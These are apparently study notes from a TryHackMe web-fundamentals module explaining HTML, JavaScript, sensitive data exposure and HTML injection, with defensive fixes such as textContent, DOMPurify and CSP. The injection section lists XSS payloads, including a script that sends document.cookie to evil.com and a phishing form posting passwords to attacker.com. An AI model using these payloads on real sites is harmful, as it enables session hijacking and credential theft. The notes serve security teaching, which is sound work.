# 🌐 How Websites Work — Structure, JavaScript & Web Vulnerabilities

> **Source:** TryHackMe — How The Web Works Module
> **Purpose:** Web fundamentals for cybersecurity & web development
> **Covers:** HTML, CSS, JS, Sensitive Data Exposure, HTML Injection

---

## 🧒 Feynman Explanation — How a Website Works

Imagine ordering pizza by phone. You (the **browser**) call the pizza
shop (the **server**) through the phone network (the **internet**).
You say what you want (the **request**). The shop makes it and sends
it back (the **response**). Your job is to eat it (the **browser
renders the page**).

The pizza has two parts:

- The **box and how it looks** = Frontend (HTML/CSS)
- **How it was made in the kitchen** = Backend (server, database)

---

## 🔷 1. How Websites Work — The Big Picture

```
Browser  ──request──▶  Internet  ──request──▶  Server
Browser  ◀──response──  Internet  ◀──response──  Server
```

### Two Major Components of Every Website

| Component     | Also Called | What It Does                                                      |
| ------------- | ----------- | ----------------------------------------------------------------- |
| **Front End** | Client-Side | What your browser renders and displays                            |
| **Back End**  | Server-Side | Processes your request, talks to the database, returns a response |

> 💡 **Security insight:** The frontend runs on YOUR machine.
> The backend runs on THEIR server. Attackers attack both — but
> frontend bugs (XSS, HTML injection) affect every user who visits.
> Backend bugs (SQLi, RCE) can compromise the entire server.

---

## 🔷 2. HTML — The Skeleton of Every Website

### 🧒 Feynman Explanation

HTML is like the **blueprint of a building**. It defines what rooms
exist (headers, paragraphs, images, buttons), where they go, and
what they contain. Without it, the browser has nothing to show.

### Website Tech Stack

| Technology     | Purpose                     | Analogy                             |
| -------------- | --------------------------- | ----------------------------------- |
| **HTML**       | Structure and content       | The building's walls and rooms      |
| **CSS**        | Styling and appearance      | The paint, furniture, decoration    |
| **JavaScript** | Interactivity and behaviour | The electricity — makes things work |

### Basic HTML Structure (Every Website Has This)

```html
<!DOCTYPE html>
<!-- tells browser: this is HTML5 -->
<html>
  <!-- root element, wraps everything -->
  <head>
    <!-- metadata (not shown on page) -->
    <title>Page Title</title>
  </head>
  <body>
    <!-- everything visible on the page -->
    <h1>Example Heading</h1>
    <p>Example paragraph..</p>
  </body>
</html>
```

### Key HTML Elements

| Element           | Purpose                 | Example                          |
| ----------------- | ----------------------- | -------------------------------- |
| `<!DOCTYPE html>` | Declares HTML5 document | Required on every page           |
| `<html>`          | Root container          | Wraps everything                 |
| `<head>`          | Page metadata           | Title, CSS links, meta tags      |
| `<body>`          | Visible content         | Everything the user sees         |
| `<h1>–<h6>`       | Headings (h1 = largest) | `<h1>Welcome</h1>`               |
| `<p>`             | Paragraph text          | `<p>Hello world</p>`             |
| `<button>`        | Clickable button        | `<button>Click Me</button>`      |
| `<img>`           | Image                   | `<img src="cat.jpg">`            |
| `<a>`             | Hyperlink               | `<a href="https://...">Link</a>` |
| `<form>`          | User input form         | Login forms, search bars         |
| `<input>`         | Input field             | Text, password, checkbox         |

### HTML Attributes (Modifiers on Elements)

```html
<!-- class — applies CSS styling, reusable across elements -->
<p class="bold-text">This is bold</p>

<!-- src — specifies image location -->
<img src="img/cat.jpg" />

<!-- id — unique identifier, used by JavaScript -->
<p id="example">Hello</p>

<!-- Multiple attributes on one element -->
<p id="main-para" attribute1="value1" attribute2="value2">Text</p>
```

> 💡 **Pentest note:** `id` and `class` attributes are often
> used by JavaScript. If you find `id="admin"` or
> `class="hidden"` in page source — investigate further.

### 💻 View Any Website's HTML Right Now

```
Chrome:  Right-click → "View Page Source"  (Ctrl+U)
Firefox: Right-click → "View Page Source"  (Ctrl+U)
DevTools: F12 → Elements tab (live, editable HTML)
```

---

## 🔷 3. JavaScript — Making Pages Alive

### 🧒 Feynman Explanation

If HTML is the building and CSS is the decoration, JavaScript is
the **electricity**. It makes things actually DO stuff — lights
turn on when you flip a switch, doors open when you press a button.
Without JS, websites would be like photographs: pretty but frozen.

### What JavaScript Can Do

```
✅ Update page content without reloading
✅ Respond to user actions (clicks, typing, hovering)
✅ Make requests to servers in the background (AJAX/fetch)
✅ Animate elements
✅ Validate forms before submitting
✅ Store data in the browser (localStorage, cookies)
```

### How JavaScript Is Loaded

```html
<!-- Method 1: Inline inside script tags -->
<script>
  document.getElementById("demo").innerHTML = "Hack the Planet";
</script>

<!-- Method 2: External file (more common, harder to inspect) -->
<script src="/location/of/javascript_file.js"></script>
```

### Core JavaScript Concepts

```javascript
// Selecting HTML elements by ID
document.getElementById("demo");

// Changing element content (innerHTML = security risk!)
document.getElementById("demo").innerHTML = "Hack the Planet";

// Event-driven code — runs when button is clicked
// HTML:
<button
  onclick='document.getElementById("demo").innerHTML = 
  "Button Clicked";'
>
  Click Me!
</button>;

// Function example from the screenshots
function sayHi() {
  const name = document.getElementById("name").value;
  // ⚠️ VULNERABLE: no sanitization before innerHTML!
  document.getElementById("welcome-msg").innerHTML = "Welcome " + name;
}
```

> ⚠️ **Security insight:** `innerHTML` directly injects content
> into the page. If user input goes into `innerHTML` without
> sanitization → **XSS (Cross-Site Scripting)** vulnerability.
> This is one of the most common web vulnerabilities in the wild.

---

## 🔷 4. Sensitive Data Exposure

### 🧒 Feynman Explanation

Imagine a bank that accidentally leaves the vault combination
written on a sticky note on the front door. That's sensitive
data exposure — the information was always there, just carelessly
left visible. In websites, developers sometimes leave passwords,
API keys, or admin credentials in the HTML source code by mistake.

### What Is Sensitive Data Exposure?

Sensitive Data Exposure occurs when a website **fails to protect
or remove** sensitive information from its frontend source code.
Anyone who views the page source can read it — no hacking required.

### Real Example From the Screenshots

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Fake Website</title>
  </head>
  <body>
    <form>
      <input type="text" name="username" />
      <input type="password" name="password" />
      <button>Login</button>
      <!-- TODO: remove test credentials admin:password123 -->
      <!--       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                 A developer left this comment in production!
                 Anyone can read this by pressing Ctrl+U      -->
    </form>
  </body>
</html>
```

### What Attackers Look For in Page Source

```
<!-- Comments with credentials -->
<!-- TODO: admin:password123 -->

<!-- Hidden form fields -->
<input type="hidden" name="isAdmin" value="false">

<!-- API keys and tokens -->
<script>
  const API_KEY = "sk-live-abc123xyz789";  // Never do this!
  const SECRET  = "my-super-secret-token";
</script>

<!-- Internal links -->
<a href="/admin/dashboard">  <!-- even without visible link text -->
<a href="/backup/database.sql">

<!-- Debug information -->
<!-- DB: mysql://admin:root@localhost/users -->
```

### 💻 How to Find Sensitive Data (Pentester Workflow)

```bash
# 1. View page source in browser
Ctrl+U  (Chrome/Firefox)

# 2. Search all JS files for keywords
grep -r "password\|secret\|api_key\|token\|admin" ./site/

# 3. Download entire site for offline analysis
wget --mirror --convert-links --no-parent https://target.com

# 4. Use browser DevTools → Sources tab
# Shows all loaded JS files, even external ones

# 5. Search with curl and grep
curl -s https://target.com | grep -i "password\|secret\|key\|TODO"

# 6. Python automation
import requests
from bs4 import BeautifulSoup
import re

def find_sensitive_data(url):
    r = requests.get(url)
    patterns = {
        "API Key":    r'api[_-]?key["\s:=]+[\w-]{20,}',
        "Password":   r'password["\s:=]+[\w@#$]{4,}',
        "Secret":     r'secret["\s:=]+[\w-]{8,}',
        "Token":      r'token["\s:=]+[\w-]{20,}',
        "Comment":    r'<!--.*?-->',
    }
    for name, pattern in patterns.items():
        matches = re.findall(pattern, r.text, re.IGNORECASE)
        if matches:
            print(f"[!] Found {name}: {matches[:3]}")

find_sensitive_data("https://target.com")
```

> ⚠️ **OWASP Reference:** This is **A02:2021 — Cryptographic
> Failures** (formerly "Sensitive Data Exposure") in the OWASP
> Top 10. It is one of the most common and easily exploitable
> vulnerabilities in real-world web applications.

### Defense (What Developers Should Do)

```
✅ Remove ALL comments before deploying to production
✅ Never hardcode credentials in HTML or JavaScript
✅ Use environment variables for secrets (process.env.API_KEY)
✅ Run automated secret scanners before git commits (truffleHog, gitleaks)
✅ Implement proper access controls on sensitive endpoints
✅ Conduct regular source code review
```

---

## 🔷 5. HTML Injection

### 🧒 Feynman Explanation

Imagine a guestbook where visitors can write their name and it
appears on the page: "Welcome, John!" But what if someone writes
their name as `<h1>I OWN THIS SITE</h1>`? The website blindly
pastes that into the page and now a giant heading appears saying
"I OWN THIS SITE." That's HTML injection — tricking a site into
displaying attacker-controlled HTML.

### What Is HTML Injection?

HTML Injection is a vulnerability where **unfiltered user input**
is displayed directly on the page. The browser treats that input
as real HTML and renders it — giving the attacker control over
the page's appearance and behaviour.

### The Vulnerable Code Pattern

```javascript
// ⚠️ VULNERABLE — input goes directly into innerHTML
function sayHi() {
  const name = document.getElementById("name").value;
  document.getElementById("welcome-msg").innerHTML = "Welcome " + name;
  //                                     ^^^^^^^^^^^
  //                This accepts raw HTML — NEVER do this with user input
}

// Attack: user types this into the "What's your name?" field:
// <h1>HACKED</h1><script>alert('XSS!')</script>
// Result: the browser renders it as real HTML/JavaScript
```

### HTML Injection → XSS Escalation

```
HTML Injection                    XSS (Cross-Site Scripting)
──────────────                    ────────────────────────────
Inject HTML tags               →  Inject JavaScript
Change page appearance         →  Steal cookies, redirect users
<h1>HACKED</h1>                →  <script>document.location=
                                    'https://evil.com?c='
                                    +document.cookie</script>
Client-side only               →  Affects all visitors
Low severity                   →  HIGH / CRITICAL severity
```

### Attack Payloads (For Pentesting Labs Only)

```html
<!-- Basic HTML injection test -->
<h1>Injected Heading</h1>
<img src="https://attacker.com/track.gif">
<a href="https://phishing.com">Click here to verify account</a>

<!-- HTML injection → XSS escalation -->
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert(1)">

<!-- Phishing via HTML injection -->
<form action="https://attacker.com/steal">
  <input name="user" placeholder="Enter username">
  <input type="password" name="pass" placeholder="Password">
  <button>Login</button>
</form>
```

### Secure vs Vulnerable Code

```javascript
// ❌ VULNERABLE — innerHTML with user input
document.getElementById("welcome").innerHTML = "Welcome " + userInput;

// ✅ SAFE — textContent never renders HTML
document.getElementById("welcome").textContent = "Welcome " + userInput;

// ✅ SAFE — sanitize before innerHTML (using DOMPurify library)
const clean = DOMPurify.sanitize(userInput);
document.getElementById("welcome").innerHTML = "Welcome " + clean;

// ✅ SAFE — server-side sanitization (Python example)
from html import escape
safe_input = escape(user_input)  # converts < to &lt; > to &gt;
```

### 💻 Finding HTML Injection (Pentester Checklist)

```
1. Find every input field on the page
   - Search boxes, login forms, contact forms, comment fields,
     URL parameters (?name=John), profile fields

2. Test with a basic HTML payload
   - Input: <h1>test</h1>
   - If a large heading appears → HTML injection confirmed

3. Check if JavaScript executes
   - Input: <script>alert(1)</script>
   - If alert pops → XSS confirmed (escalate severity to High/Critical)

4. Use browser DevTools → Network tab
   - Watch if your input appears in responses unescaped

5. Check page source after submitting
   - Ctrl+U → search for your input
   - If it appears as raw HTML tags → vulnerable
```

---

## 🔗 Cybersecurity Attack Map

| Vulnerability                 | Attack Type            | OWASP Category             | Severity      |
| ----------------------------- | ---------------------- | -------------------------- | ------------- |
| Sensitive data in HTML source | Information Disclosure | A02 Cryptographic Failures | Medium–High   |
| innerHTML with user input     | XSS                    | A03 Injection              | High–Critical |
| Hardcoded API keys in JS      | Credential Exposure    | A02 Cryptographic Failures | Critical      |
| Hidden form fields (isAdmin)  | Privilege Escalation   | A01 Broken Access Control  | High          |
| HTML injection                | HTML Injection         | A03 Injection              | Medium        |

---

## ⚡ Enriched Insights (Beyond the Source Material)

### The DOM — Why innerHTML Is Dangerous

```
DOM = Document Object Model
The browser builds a live "tree" of your HTML page.
JavaScript can read and MODIFY this tree at any time.

       document
          │
        <html>
       /      \
   <head>    <body>
               │
          <div id="welcome">
               │
          "Welcome John"   ← JavaScript can change this to ANYTHING
```

When you use `innerHTML`, you are directly editing this tree.
If attacker-controlled content goes in → attacker controls the DOM
→ attacker controls what every user sees and experiences.

### Content Security Policy (CSP) — The Defense

```html
<!-- Tell the browser: only run scripts from MY domain -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'"
/>

<!-- This blocks inline <script> tags and external script injections -->
<!-- One of the most powerful XSS defenses available -->
```

### The Developer Console — Your Recon Weapon

```javascript
// Open with F12 → Console tab
// Try these on any website:

document.cookie; // all cookies for this site
localStorage; // stored data in browser
document.domain; // current domain
document.forms; // all forms on the page

// Find all script tags and their sources
document.querySelectorAll("script[src]").forEach((s) => console.log(s.src));

// Find all hidden inputs
document
  .querySelectorAll('input[type="hidden"]')
  .forEach((i) => console.log(i.name, i.value));

// Search for keywords in page source
document.documentElement.innerHTML.includes("password");
```

### OWASP Top 10 Web Vulnerabilities (Know All of These)

```
A01 — Broken Access Control      (most common 2021)
A02 — Cryptographic Failures     (sensitive data exposure)
A03 — Injection                  (SQLi, XSS, HTML injection)
A04 — Insecure Design
A05 — Security Misconfiguration
A06 — Vulnerable Components
A07 — Auth & Session Failures
A08 — Software Integrity Failures
A09 — Logging & Monitoring Failures
A10 — Server-Side Request Forgery (SSRF)
```

> 💡 **Career note:** Every web pentest report references OWASP.
> Every SOC analyst investigating web attacks references OWASP.
> Memorize the Top 10 — it is the universal language of web security.

---

_Notes compiled from TryHackMe — How The Web Works Module_
_Enriched with security context, code examples, and Feynman explanations_
